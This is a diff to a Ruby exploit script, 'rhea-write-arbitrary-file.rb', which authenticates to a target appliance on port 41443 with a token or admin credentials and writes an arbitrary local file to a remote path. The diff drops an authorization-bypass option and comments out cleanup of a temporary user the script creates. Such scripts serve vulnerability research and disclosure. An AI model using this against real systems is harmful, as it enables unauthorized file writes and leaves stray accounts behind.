@@ -1,11 +1,11 @@
 require './librhea.rb'
 
-if ARGV.length < 3 || ARGV.length == 4
+if ARGV.length < 4
   $stderr.puts 'Usage:'
   $stderr.puts
-  $stderr.puts "#{$1} <target ip> <local file path> <remote file path> [username] [password]"
+  $stderr.puts "ruby rhea-write-arbitrary-file.rb <target ip> <local file path> <remote file path> [session_token]|[username password]"
   $stderr.puts
-  $stderr.puts "(If username:password are omitted, we attempt to bypass authorization)"
+  $stderr.puts "You must either specify a session_token, which must be authorized, or a username/password for an admin user"
   exit 1
 end
 
@@ -24,12 +24,16 @@ else
   REMOTE_PATH, REMOTE_FILE = File.split(REMOTE_FILENAME)
 end
 
-USERNAME    = ARGV[3]
-PASSWORD    = ARGV[4]
-
 BASE_URL = "https://#{ARGV[0]}:41443"
-puts "Establishing a session on #{BASE_URL}"
-RHEA = LibRhea::new(BASE_URL, USERNAME, PASSWORD)
+puts "Establishing a session on #{BASE_URL}..."
+if ARGV.length == 4
+  $stderr.puts "Authenticating with session token: #{ARGV[3]}"
+  RHEA = LibRhea::new(BASE_URL, token: ARGV[3])
+else
+  $stderr.puts "Authenticating with username/password: #{ARGV[3]} / #{ARGV[4]}"
+  RHEA = LibRhea::new(BASE_URL, username: ARGV[3], password: ARGV[4])
+end
+
 
 # Generate random creds
 NEW_USERNAME = (0...16).map { (0x61 + rand(26)).chr }.join
@@ -62,7 +66,7 @@ else
   puts "File likely uploaded! Deleting the new user..."
 end
 
-RHEA.delete_user(
-  username: NEW_USERNAME,
-  uuid: NEW_UUID,
-)
+# RHEA.delete_user(
+#   username: NEW_USERNAME,
+#   uuid: NEW_UUID,
+# )
